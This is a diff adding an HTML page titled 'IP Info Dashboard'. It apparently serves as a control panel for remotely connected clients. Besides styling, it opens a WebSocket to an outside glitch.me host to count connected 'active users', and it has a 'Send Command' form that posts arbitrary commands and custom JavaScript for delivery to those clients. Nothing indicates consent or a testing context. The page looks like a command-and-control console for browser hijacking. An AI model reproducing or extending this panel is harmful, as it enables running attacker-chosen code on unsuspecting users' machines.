@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>IP Info Dashboard</title>
+        <link
+            href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+            rel="stylesheet"
+        />
+        <style type="text/css">
+            body {
+                font-family: "Roboto", sans-serif;
+                background-color: #f4f4f9;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: #333;
+            }
+
+            .container {
+                background: #fff;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                padding: 20px;
+                border-radius: 8px;
+                width: 90%;
+                max-width: 1200px;
+            }
+
+            h1 {
+                font-weight: 500;
+                margin-bottom: 20px;
+                text-align: center;
+                color: #4a90e2;
+            }
+
+            .info {
+                text-align: center;
+                margin-bottom: 20px;
+                font-size: 1.2em;
+            }
+
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-bottom: 20px;
+            }
+
+            th,
+            td {
+                border: 1px solid #ddd;
+                padding: 12px;
+                text-align: left;
+            }
+
+            th {
+                background-color: #4a90e2;
+                color: #fff;
+                font-weight: 500;
+            }
+
+            tr:nth-child(even) {
+                background-color: #f9f9f9;
+            }
+
+            tr:hover {
+                background-color: #f1f1f1;
+            }
+
+            .pagination {
+                text-align: center;
+                margin-top: 20px;
+            }
+
+            .pagination button {
+                background-color: #4a90e2;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                margin: 0 5px;
+                cursor: pointer;
+                border-radius: 5px;
+            }
+
+            .pagination button:disabled {
+                background-color: #ccc;
+                cursor: not-allowed;
+            }
+
+            .pagination span {
+                font-size: 1.2em;
+            }
+
+            .sendcmd input,
+            textarea {
+                display: block;
+                margin-bottom: 10px;
+                padding: 11px;
+                width: 400px;
+                border-radius: 4px;
+            }
+
+            .sendcmd button {
+                background-color: #4a90e2;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                margin-bottom: 0 5px;
+                cursor: pointer;
+                border-radius: 5px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div>
+                <h1>IP Information Dashboard</h1>
+                <div class="info">
+                    <p>
+                        <strong>Total Active Users:</strong>
+                        <span id="active-users">0</span>
+                    </p>
+                </div>
+            </div>
+            <div>
+            </div>
+            <hr />
+            <div class="sendcmd">
+                <h3>Send Command</h3>
+                <input
+                    type="text"
+                    id="commandInput"
+                    placeholder="Enter command"
+                />
+                <textarea
+                    id="scriptInput"
+                    placeholder="Enter custom JS script"
+                    rows="5"
+                ></textarea>
+                <button onclick="sendCommand()">Send</button>
+                <div id="message" class="message"></div>
+            </div>
+        </div>
+        <script>
+            document.addEventListener("DOMContentLoaded", () => {
+                const socket = new WebSocket("wss://childlike-cliff-wrench.glitch.me/tr");
+            
+                socket.onmessage = (event) => {
+                    clientsData = JSON.parse(event.data);
+                    updateActiveUsers(clientsData.length);
+                };
+
+
+
+                function updateActiveUsers(count) {
+                    document.getElementById("active-users").textContent = count;
+                }
+
+            });
+
+            function sendCommand() {
+                const command = document.getElementById("commandInput").value;
+                const script = document.getElementById("scriptInput").value;
+                fetch("/send-command", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({ command, script }),
+                })
+                    .then((response) => response.json())
+                    .then((data) => {
+                        const messageEl = document.getElementById("message");
+                        if (data.success) {
+                            messageEl.textContent =
+                                "Command/script sent successfully!";
+                            messageEl.style.color = "green";
+                        } else {
+                            messageEl.textContent =
+                                "Failed to send command/script.";
+                            messageEl.style.color = "red";
+                        }
+                    })
+                    .catch((error) => {
+                        const messageEl = document.getElementById("message");
+                        messageEl.textContent = "Error: " + error.message;
+                        messageEl.style.color = "red";
+                    });
+            }
+        </script>
+    </body>
+</html>
